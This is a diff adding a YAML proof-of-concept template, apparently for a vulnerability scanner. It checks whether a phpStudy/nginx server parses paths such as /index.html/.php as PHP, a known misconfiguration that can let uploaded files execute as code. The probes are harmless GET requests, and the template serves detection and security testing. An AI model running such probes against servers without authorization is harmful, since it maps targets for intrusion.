@@ -1,0 +1,153 @@
+name: poc-yaml-phpstudy-nginx-wrong-resolve
+manual: true
+transport: http
+set:
+    name: randomInt(10000000, 99999999)
+rules:
+    check:
+        request:
+            cache: true
+            method: GET
+            path: /
+            follow_redirects: false
+        expression: >-
+          (versionIn("nginx/(?P<version>[\\d\\.]*)".submatch(response.headers["Server"])["version"],
+          ">=0.8.41, <1.4.3") ||
+          versionIn("nginx/(?P<version>[\\d\\.]*)".submatch(response.headers["Server"])["version"],
+          ">=1.5.0, <1.5.7") || "nginx$".matches(response.headers["Server"]) || " nginx ".matches(response.headers["Server"]))
+    html0:
+        request:
+            cache: true
+            method: GET
+            path: /{{name}}.html
+            follow_redirects: false
+        expression: response.status != 200
+    html1:
+        request:
+            cache: true
+            method: GET
+            path: /index.html
+            follow_redirects: false
+        expression: |-
+          response.status == 200 
+    html2:
+        request:
+            cache: true
+            method: GET
+            path: /index.html/.php
+            follow_redirects: false
+        expression: |-
+          response.status == 200 
+          && (
+          response.headers['X-Powered-By'].contains("PHP")
+          || response.headers['Server'].contains("PHP")
+          )
+    html3:
+        request:
+            cache: true
+            method: GET
+            path: /{{name}}.html/.php
+            follow_redirects: false
+        expression: response.status != 200
+    html4:
+        request:
+            cache: true
+            method: GET
+            path: /index.html/.xxx
+            follow_redirects: false
+        expression: response.status != 200
+    php0:
+        request:
+            cache: true
+            method: GET
+            path: /{{name}}.php
+            follow_redirects: false
+        expression: response.status != 200
+    php1:
+        request:
+            cache: true
+            method: GET
+            path: /index.php
+            follow_redirects: false
+        expression: |-
+          response.status == 200 
+    php2:
+        request:
+            cache: true
+            method: GET
+            path: /index.php/.php
+            follow_redirects: false
+        expression: |-
+          response.status == 200 
+          && (
+          response.headers['X-Powered-By'].contains("PHP")
+          || response.headers['Server'].contains("PHP")
+          )
+    php3:
+        request:
+            cache: true
+            method: GET
+            path: /{{name}}.php/.xxx
+            follow_redirects: false
+        expression: response.status != 200
+    php4:
+        request:
+            cache: true
+            method: GET
+            path: /index.php/.xxx
+            follow_redirects: false
+        expression: response.status != 200
+
+    robots0:
+        request:
+            cache: true
+            method: GET
+            path: /{{name}}.txt
+            follow_redirects: false
+        expression: response.status != 200
+    robots1:
+        request:
+            cache: true
+            method: GET
+            path: /robots.txt
+            follow_redirects: false
+        expression: response.status == 200
+    robots2:
+        request:
+            cache: true
+            method: GET
+            path: /robots.txt/.php
+            follow_redirects: false
+        expression: |-
+          response.status == 200 
+          && (
+          response.headers['X-Powered-By'].contains("PHP")
+          || response.headers['Server'].contains("PHP")
+          )
+    robots3:
+        request:
+            cache: true
+            method: GET
+            path: /{{name}}.txt/.xxx
+            follow_redirects: false
+        expression: response.status != 200
+    robots4:
+        request:
+            cache: true
+            method: GET
+            path: /robots.txt/.xxx
+            follow_redirects: false
+        expression: response.status != 200
+expression: |-
+  (
+  html0() && html1() && html2() && html3() && html4() 
+  || php0() && php1() && php2() && php3() && php4()
+  || robots0() && robots1() && robots2() && robots3() && robots4()
+  )
+detail:
+    author: LoRexxar(https://lorexxar.cn),0h1in9e(https://www.ohlinge.cn)
+    links:
+        - https://www.seebug.org/vuldb/ssvid-98364
+    vulnerability:
+        id: CT-158827
+        level: high
